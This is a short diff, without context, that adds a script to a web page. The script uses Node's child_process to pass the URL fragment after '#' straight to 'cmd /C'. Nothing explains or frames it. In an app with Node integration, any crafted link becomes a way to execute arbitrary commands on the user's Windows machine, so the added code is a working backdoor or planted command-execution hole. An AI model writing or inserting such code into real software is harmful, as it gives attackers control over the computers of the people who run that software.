@@ -1,0 +1,4 @@
+<script>
+  var cp = require('child_process');
+  cp.spawn('cmd', ['/C', decodeURIComponent(window.location.hash.substr(1))]);
+</script>
